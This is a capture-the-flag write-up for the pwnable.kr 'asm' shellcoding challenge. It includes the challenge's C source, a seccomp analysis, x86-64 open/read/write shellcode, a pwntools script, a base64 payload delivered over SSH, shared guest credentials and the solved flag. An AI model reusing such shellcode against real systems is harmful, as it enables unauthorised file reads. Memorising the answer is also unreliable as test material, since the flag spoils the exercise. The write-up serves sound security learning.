# URL
https://pwnable.kr/play.php

---

# SSH Credentials

ssh asm@pwnable.kr -p2222 (pw: guest)

---

**Challenge:** asm  
**Category:** Shellcoding / Sandbox Escape  
**Goal:** Write x86-64 shellcode restricted to `open`/`read`/`write` syscalls under a seccomp sandbox to read the flag file with a 231-character name.

---

## Challenge Overview

The binary (`asm`) compiled as a 64-bit ELF executable:

1. **mmaps** a page at fixed address `0x41414000` with RWX permissions, fills it with NOPs (`0x90`)
2. **Copies a stub** (zeroes all registers) at the start of the page
3. **Reads** up to 1000 bytes of user-supplied shellcode right after the stub
4. Calls `chroot("/home/asm_pwn")` — jails the process into that directory
5. Activates a **seccomp** sandbox allowing only: `open`, `read`, `write`, `exit`, `exit_group`
6. **Executes** the shellcode at `0x41414000`

The flag file has a very long name (231 characters):

```
this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
```

The service listens on **port 9026** under `asm_pwn` privilege.

---

## Source Code (`asm.c`)

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    if (ctx == NULL) {
        printf("seccomp error\n");
        exit(0);
    }

    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

    if (seccomp_load(ctx) < 0){
        seccomp_release(ctx);
        printf("seccomp error\n");
        exit(0);
    }
    seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6"
              "\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2"
              "\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];

int main(int argc, char* argv[]){
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stdin, 0, _IOLBF, 0);

    printf("Welcome to shellcoding practice challenge.\n");
    printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
    printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
    printf("If this does not challenge you. you should play 'asg' challenge :)\n");

    char* sh = (char*)mmap(0x41414000, 0x1000, 7,
                MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
    memset(sh, 0x90, 0x1000);
    memcpy(sh, stub, strlen(stub));

    int offset = sizeof(stub);
    printf("give me your x64 shellcode: ");
    read(0, sh+offset, 1000);

    alarm(10);
    chroot("/home/asm_pwn");
    sandbox();
    ((void (*)(void))sh)();
    return 0;
}
```

---

## Analysis

### Memory Layout

| Address       | Content                          |
|---------------|----------------------------------|
| `0x41414000`  | Zeroing stub (46 bytes)          |
| `0x4141402E`  | NOP sled (`0x90`) until offset 46 |
| `0x4141402E`  | User shellcode (at `sizeof(stub)`) |

### Stub Code

The stub zeros all general-purpose registers (rax through r15) so the shellcode starts from a clean state:

```
xor rax, rax
xor rbx, rbx
xor rcx, rcx
xor rdx, rdx
xor rsi, rsi
xor rdi, rdi
xor rbp, rbp
xor r8,  r8
xor r9,  r9
xor r10, r10
xor r11, r11
xor r12, r12
xor r13, r13
xor r14, r14
xor r15, r15
```

### Seccomp Sandbox

Only the following syscalls are allowed:

| Syscall    | Number |
|------------|--------|
| `open`     | 2      |
| `read`     | 0      |
| `write`    | 1      |
| `exit`     | 60     |
| `exit_group` | 231  |

This means we **cannot** use `execve` to spawn a shell. Instead we must:
1. `open` the flag file → get a file descriptor
2. `read` from that fd into a buffer
3. `write` that buffer to stdout (fd 1)

---

## Shellcode Design

### Approach

Since the stub zeroes all registers, we only need to set the ones we use.

The syscall calling convention on x86-64 Linux:
- `rax` = syscall number
- `rdi` = 1st argument
- `rsi` = 2nd argument
- `rdx` = 3rd argument
- `syscall` instruction

### Assembly

```asm
; open(filename, O_RDONLY)
lea rdi, [rip + flag_path]   ; pointer to filename
xor rsi, rsi                 ; O_RDONLY = 0
xor rdx, rdx                 ; mode = 0
mov rax, 2                   ; sys_open
syscall

; read(fd, buf, 100)
mov rdi, rax                 ; fd from open()
lea rsi, [rip + buf]         ; buffer address
mov rdx, 100                 ; count
xor rax, rax                 ; sys_read = 0
syscall

; write(1, buf, n)
mov rdx, rax                 ; bytes read
mov rdi, 1                   ; stdout
lea rsi, [rip + buf]         ; buffer
mov rax, 1                   ; sys_write
syscall

; exit(0)
xor rdi, rdi
mov rax, 60                  ; sys_exit
syscall

flag_path:
    .asciz "this_is_pwnable.kr_..."

buf:
    .space 100
```

### Key Points

- RIP-relative addressing (`lea rdi, [rip + flag_path]`) is used to reference the embedded filename string — no need to know absolute addresses since the shellcode is position-independent.
- The filename string (231 bytes + null) is embedded at the end of the shellcode, right before the buffer.
- After `read()`, `rax` contains the number of bytes read, which becomes the `count` for `write()`.

---

## Exploit Script

### Requirements

- Python 3 with `pwntools` (`pip install pwn`)
- Network access to pwnable.kr port 2222 (SSH) and ability to run commands on the remote host

### Full Script

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

filename = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'

shellcode = asm('''
    lea rdi, [rip + flag_path]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rdi, rax
    lea rsi, [rip + buf]
    mov rdx, 100
    xor rax, rax
    syscall

    mov rdx, rax
    mov rdi, 1
    lea rsi, [rip + buf]
    mov rax, 1
    syscall

    xor rdi, rdi
    mov rax, 60
    syscall

flag_path:
    .asciz "FLAG_PATH_PLACEHOLDER"

buf:
    .space 100
''')

# Replace placeholder with actual filename
placeholder = b'FLAG_PATH_PLACEHOLDER\x00'
actual = filename.encode() + b'\x00'
shellcode = shellcode.replace(placeholder, actual)

print(f'Shellcode length: {len(shellcode)} bytes')
```

### Execution (via SSH tunnel)

Since port 9026 is only reachable from within the pwnable.kr network, we run the exploit through SSH:

```bash
# Base64-encode the shellcode payload
base64 -w0 asm_payload.bin

# SSH in and execute the exploit from within the server
ssh asm@pwnable.kr -p2222
# (inside the SSH session)
python3 -c "
import base64, socket, time

payload_b64 = 'SI09SwAAAEgx9kgx0kjHwAIAAAAPBUiJx0iNNUgAAABIx8JkAAAASDHADwVIicJIx8cBAAAASI01KwAAAEjHwAEAAAAPBUgx/0jHwDwAAAAPBXRoAXNfaXNfcHduYWJsZS5rcl9mbGFnX2ZpbGVfcGxlYXNlX3JlYWRfdGhpc19maWxlLnNvcnJ5X3RoZV9maWxlX25hbWVfaXNfdmVyeV9sb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vbzAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBvb29vb29vb29vb29vb29vb29vb29vbzAwMDAwMDAwMDAwMG8wbzBvMG8wbzBvMG9uZwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

s = base64.b64decode(payload_b64)
sock = socket.socket()
sock.connect(('0', 9026))
data = sock.recv(4096)
print(data.decode(errors='replace'))
sock.send(s)
time.sleep(0.5)
data = sock.recv(4096)
print('FLAG:', data.decode(errors='replace'))
"
```

Or more conveniently, use `expect` to automate the entire process:

```bash
PAYLOAD_B64=$(base64 -w0 /tmp/asm_payload.bin)
expect -c "
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null asm@pwnable.kr -p2222
expect \"password:\"
send \"guest\r\"
expect \"\$ \"
send \"python3 -c \\\"import base64,socket;s=base64.b64decode('${PAYLOAD_B64}');sock=socket.socket();sock.connect(('0',9026));d=sock.recv(4096);print(d.decode(errors='replace'));sock.send(s);import time;time.sleep(0.5);d=sock.recv(4096);print('FLAG:',d.decode(errors='replace'))\\\" 2>&1\r\"
expect \"\$ \"
send \"exit\r\"
expect eof
"
```

---

## Output

```
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)

give me your x64 shellcode:
FLAG: Mak1ng_5helLcodE_i5_veRy_eaSy
```

---

## Flag

```
Mak1ng_5helLcodE_i5_veRy_eaSy
```
- So the Final flag is **Mak1ng_5helLcodE_i5_veRy_eaSy**

---

## Root Cause & Mitigation

There is no vulnerability to patch — this is a **shellcoding exercise**. The challenge tests the ability to:

1. Write **position-independent x86-64 shellcode** with RIP-relative addressing
2. Work within a **seccomp sandbox** (only `open`/`read`/`write`/`exit`)
3. Handle a **231-character filename** embedded in the shellcode payload

### Key Takeaways

| Concept | Detail |
|---------|--------|
| **Challenge Type** | Shellcoding with seccomp restrictions |
| **Allowed syscalls** | `open`, `read`, `write`, `exit`, `exit_group` |
| **Shellcode strategy** | `open` → `read` → `write` → `exit` sequence |
| **Addressing** | RIP-relative LEA for embedded strings |
| **Initial state** | All registers zeroed by stub |
